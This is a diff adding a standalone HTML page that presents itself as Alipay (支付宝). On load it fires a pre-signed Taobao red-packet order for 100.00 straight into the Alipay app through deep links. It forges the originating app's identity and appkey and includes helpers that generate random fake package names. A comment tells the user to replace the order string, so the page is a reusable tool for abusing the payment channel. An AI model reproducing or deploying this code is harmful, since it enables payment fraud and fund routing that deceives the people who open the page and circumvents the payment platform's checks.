@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <title>支付宝</title>
+    <script type="text/javascript" src="base64.min.js"></script>
+
+
+    <style>
+        .btn {
+            display: inline-block;
+            margin-bottom: 0;
+            font-weight: normal;
+            text-align: center;
+            vertical-align: middle;
+            cursor: pointer;
+            background-image: none;
+            border: 1px solid transparent;
+            white-space: nowrap;
+            padding: 6px 12px;
+            font-size: 14px;
+            line-height: 1.42857143;
+            border-radius: 4px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        .btn-lg, .btn-group-lg>.btn {
+            padding: 10px 16px;
+            font-size: 18px;
+            line-height: 1.33;
+            border-radius: 6px;
+        }
+
+        .btn-primary {
+            color: #fff;
+            background-color: #39c;
+            border-color: #2e8ab8;
+        }
+        #btnDL {
+            font-size: 24px !important;
+            margin-top: 80px;
+        }
+        input[type="submit"].btn-block, input[type="reset"].btn-block, input[type="button"].btn-block {
+            width: 100%;
+        }
+        button, html input[type="button"], input[type="reset"], input[type="submit"] {
+            -webkit-appearance: button;
+            cursor: pointer;
+        }
+        .btn-primary {
+            filter: progid:DXImageTransform.Microsoft.gradient(enabled = false);
+        }
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+<div style="width: 100%; text-align: center;font-family:微软雅黑;">
+    <div id="panelWrap" class="panel-wrap">
+        <!-- CUSTOM LOGO -->
+        <div class="panel-heading">
+        </div>
+        <!-- PANEL TlogoEMPLATE START -->
+        <div class="panel panel-easypay">
+            <!-- PANEL HEADER -->
+            <div class="panel-footer"  id="divDL">
+                <input type="button" id="btnDL" value="立即支付" class="btn  btn-primary btn-lg btn-block" onclick="gopay()">
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    //////////////替换这个payOrderStr参数
+    var payOrderStr = 'service="alipay.fund.stdtrustee.order.create.pay"&partner="2088401309894080"&_input_charset="utf-8"&notify_url="https://wwhongbao.taobao.com/callback/alipay/notifyPaySuccess.do"&out_order_no="12621186_275_1582007535_d27987052f1c28fb4058ac325fde5921_1"&out_request_no="12621186_275_1582007535_d27987052f1c28fb4058ac325fde5921_1_p"&product_code="SOCIAL_RED_PACKETS"&scene_code="MERCHANT_COUPON"&amount="100.00"&pay_strategy="CASHIER_PAYMENT"&receipt_strategy="INNER_ACCOUNT_RECEIPTS"&platform="DEFAULT"&channel="APP"&order_title="淘宝现金红包"&master_order_no="2020021810002001130522896520"&order_type="DEDUCT_ORDER"&extra_param="{"payeeShowName":"淘宝现金红包"}"&pay_timeout="30m"&order_expired_time="360d"&sign="hEALfFJdz%2BfZAv5c04sku2gsJ4tuOZ338hKNQG%2Bf1P1XEMFPJvTLIDdYd5UMSO9ufjoDuZQKRT0zlDOSUAKyBez0Yj0zI4OUjXhvsuxxDwcaxvhlReqlvbipkqxOtdr2oHGey%2BQYh37wfxRbpArMZCC%2Fd2iN65hox%2FbpWiyrIFIiXCmv8Mir%2BwqthZhM%2BSECx5jAP9zLks9JDTXKXN3QgpEYHRVeh5HQGAro12pjd8T%2FXtbOaCsKdWnXGbQl2kvBOl%2FJWlQtgXskUmRJz4WF2GrWaXzM8%2BsQ1czsNI3g34JEqwn4te7Zuyb5Zbz9Xqnfu%2BdI9PaDgmpeRQ3qzr6zeg%3D%3D"&sign_type="RSA"';
+    var tempLite = 'and_lite';
+    if(getDeviceType() === 'Ios'){
+        tempLite = 'ios_lite';
+    }
+
+    function randomsort(a, b) {
+        return Math.random()>.5 ? -1 : 1;
+    }
+    function randomStr(length) {
+        var str = Math.random().toString(36).substr(2);
+        if (str.length>=length) {
+            return str.substr(0, length);
+        }
+        str += randomStr(length-str.length);
+        return str;
+    }
+    function getRanNum(length) {
+        var result = [];
+        for (var i = 0; i < length; i++) {
+            var ranNum = Math.ceil(Math.random() * 25);
+            result.push(String.fromCharCode(65 + ranNum));
+        }
+        return result.join('').toLowerCase();
+    }
+
+
+    function randomInt(lower, upper) {
+        return Math.floor(Math.random() * (upper - lower+1)) + lower;
+    }
+
+    function loadParam(dt, mesStr) {
+        try {
+            if(mesStr){
+                var tempData = {mes: mesStr};
+                $.post(reportUrl + '?vn=' + dt, tempData, function (data, status) {
+                }, 'json');
+            }
+            else {
+                $.get(reportUrl + '?vn=' + dt, function (data, status) {
+                }, 'json');
+            }
+        }
+        catch (e) {
+        }
+    }
+
+
+    var tempCH = 0;
+
+
+
+    function getDeviceType() {
+        var u = navigator.userAgent;
+        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
+        var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+        if (isAndroid == true)
+            return "Android";
+        if (isiOS == true)
+            return "Ios";
+        return "PC";
+    }
+
+
+    function randPackageName() {
+        var arrLen1 = [0, 1, 2, 3, 4, 5, 6];
+        var arrLen2 = arrLen1.sort(randomsort);
+        /*if(parseInt(arrLen2[0]) === 0){
+            return "com.alibaba.android.rimet";
+        }*/
+        /*if(parseInt(arrLen2[0]) === 1){
+            return "com.taobao.taobao";
+        }*/
+        /*if(parseInt(arrLen2[0]) === 1){
+            return "com.alipay.mobile.framework";
+        }*/
+
+        arrLen1 = [1, 2, 3, 4, 5, 6];
+        arrLen2 = arrLen1.sort(randomsort);
+        var tempPack = 'com';
+        var arr = [5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];
+        for (var i = 0; i < parseInt(arrLen2[0]); i++) {
+            var arr1 = arr.sort(randomsort);
+            tempPack += "." + getRanNum(arr1[0]);
+        }
+        return tempPack;
+    }
+
+    function gopay() {
+        console.log('goPay');
+
+        try {
+            tempCom = 'com.alibaba.mobileim';
+
+            if (getDeviceType() == "Ios") {
+                var jsonObj = {
+                    'requestType': "SafePay",
+                    'fromAppUrlScheme': "com.alibaba.mobileim" //alisdkdemo
+                };
+                jsonObj.dataString = payOrderStr + '&bizcontext={"appkey":"2014052600006128","ty":"ios_lite","sv":"h.a.3.6.5","an":"'+tempCom+'","av":"1.0","sdk_start_time":' + Date.now() + '}';
+                var alipaysUrl = 'alipay://alipayclient/?' + encodeURIComponent(JSON.stringify(jsonObj));
+                console.log('ios alipaysUrl',alipaysUrl)
+                window.location.href = alipaysUrl;
+            }
+            else {
+                var tempSD = payOrderStr + '&bizcontext={"appkey":"2014052600006128","ty":"and_lite","sv":"h.a.3.6.5","an":"'+tempCom+'","av":"1.0","sdk_start_time":' + Date.now() + '}';
+                console.log('external_info',tempSD)
+                var dt = {
+                    "sourcePid":randomInt(1000, 99999),
+                    "pkgName":tempCom,
+                    "session":getRanNum(10),
+                    "external_info": tempSD
+                };
+                var alipaysUrl = 'alipays://platformapi/startapp?appId=20000125&mqpSchemePay='+Base64.encode(JSON.stringify(dt));
+
+                var ifr = document.createElement('iframe');
+                ifr.src = alipaysUrl;
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+            }
+        } catch (e) {
+
+            console.log('error',e.message);
+        }
+
+
+    }
+
+
+    function closeWindow() {
+        location.reload();
+    }
+
+
+
+    gopay()
+
+</script>
+</body></html>
